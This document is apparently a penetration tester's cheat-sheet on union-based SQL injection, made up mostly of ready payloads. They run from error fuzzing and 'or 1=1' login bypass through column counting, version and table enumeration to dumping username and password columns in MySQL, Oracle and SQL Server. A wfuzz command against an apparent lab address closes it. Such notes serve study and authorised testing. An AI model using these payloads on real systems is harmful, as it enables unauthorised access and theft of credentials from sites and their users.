### Normal SQL Injection

The `normal` type of SQL injection attacks are ones that actually give you some output to work with.  You may or may not get an error code that shows you to full SQL query, but you can at least see some output.

#### Fuzzing

1. Try to generate an error to see if it's sanitizing text

   ```sql
   -- Enter an answer with a single quote
   test'
   ```

2. If an error is generated, try to gain control of the query without generating an error (note, this can also be used to bypass a login prompt sometimes)

   ```sql
   -- MySQL
   test' or 1=1;#
   -- Oracle
   test' or 1=1--
   -- SQL Server
   test' or 1=1 )--
   ```

#### Enumeration

1. If you can do this, then begin enumeration by determining the number of columns until it breaks.  You will likely need to play with the syntax until you find the right quotes, semicolons, comment markers, etc

   ```sql
   -- Past MySQL examples
   text' order by 4--
   -- OR
   1 order by 1
   -- Past Oracle example
   text' order by 4--
   ```

2. Once you find the number of columns, you may need to figure out the data type of each column.  You can examine the output and make an educated guess on which column text is allowed to show up.
   This is just bruteforce, finding which combination works.  You can use any valid tables as the target, but just use numbers as the fields to keep it simple.  Single quotes turns a number to text.

   ```sql
   -- Oracle Example (Not sure if I needed the FROM table)
   test' union all select '1','2','3' FROM all_tables--
   test' union all select '1','2',3 FROM all_tables--WIN
   test' union all select '1',2,'3' FROM all_tables--
   test' union all select '1',2,3 FROM all_tables--
   test' union all select 1,'2','3' FROM all_tables--
   test' union all select 1,'2',3 FROM all_tables--
   test' union all select 1,2,'3' FROM all_tables--
   test' union all select 1,2,3 FROM all_tables--
   
   -- MS SQL
   test' union all select 1,2,3--
   ```

   Once you find the right combo, this will also tell you where the data from the columns falls in the output based on where you see the numbers as well as any columns that aren't displayed, demonstrated by missing numbers.

3. List the Database version (and check for vulnerabilities on it):

   ```sql
   -- MySQL
   1 union all select 1, 2, @@version
   -- Oracle
   test' union all select '1',banner,3 FROM v$version--
   
   -- Options
   --Oracle 	SELECT banner FROM v$version
   --			SELECT version FROM v$instance
   --Microsoft 	SELECT @@version
   --PostgreSQL 	SELECT version()
   --MySQL 	SELECT @@version 
   --H2		SELECT H2VERSION() FROM DUAL
   ```

4. List the tables in the database:

   ```sql
   -- MySQL
   1 union all select 1,  table_name, 3 from information_schema.tables
   
   -- Oracle
   test' union all select table_name,'2',3 FROM all_tables--
   ```

5. Check out the columns of tables of interest

   ```sql
   -- MySQL
   1 union all select 1,  column_name, 3 from information_schema.columns where table_name='users'
   
   -- Oracle
   test' union all select column_name,'2',3 FROM all_tab_cols WHERE table_name = 'NAME'--
   ```

6. List columns of interest from tables of interest.  You can list as many columns as you have appropriate fields for.

   ```sql
   -- MySQL
   1 union all select 1, username, password from users
   
   -- Oracle
   test' union all select user_name,password,3 FROM web_users--
   ```

#### Automated Fuzzing

You can try to do automated fuzzing with wfuzz, but I've had better results doing it manually.

```bash
# Generating jobs using bad_chars.txt and an example data payload obtained from BurpSuite
wfuzz -c --sc 200 -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d 'ip=__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=ulyGXDJSSf%2FbIEz1fwPaNgTv40OT%2FY4xY%2Bm25rKOusBcCt6fZiydyA4zc%2BVE%2BVqcfZMS9qDXTUMBHRAac5%2FSfRpAoQbTXaZb1lx%2Fopvoi5c%3D&__VIEWSTATEGENERATOR=A9B807B2&__EVENTVALIDATION=CN9RbdSLtXu9hfxZ%2BvXVwj3IhtM53%2FJ2DnZp%2BkVHJlsY7JnSqKiaerwXt01pTN5ibhN7bOBtqbwcUw4I1xic9ERX%2F7BMElKvt1I2kuvxJvrUgBBg0lIou8nen6UQVgJ%2Bl%2FlgFoKLwDHdQCTuO6o9%2F1Z0tbuFYiCBZEu%2FoB%2BgOkc%3D&ctl00%24MainContent%24UsernameBox=FUZZ&ctl00%24MainContent%24emailBox=asdasd&ctl00%24MainContent%24submit=Submit' -u http://10.11.1.229/ -v --oF wfuzz.txt
```

This site has some good wordlists:  https://github.com/payloadbox

#### Links

Excellent SQL Injection Cheat Sheet:  https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/

Another good cheat sheet:  https://sqlwiki.netspi.com/injectionTypes/unionBased/#mysql

Some more details on SQLi:  https://www.exploit-db.com/papers/12975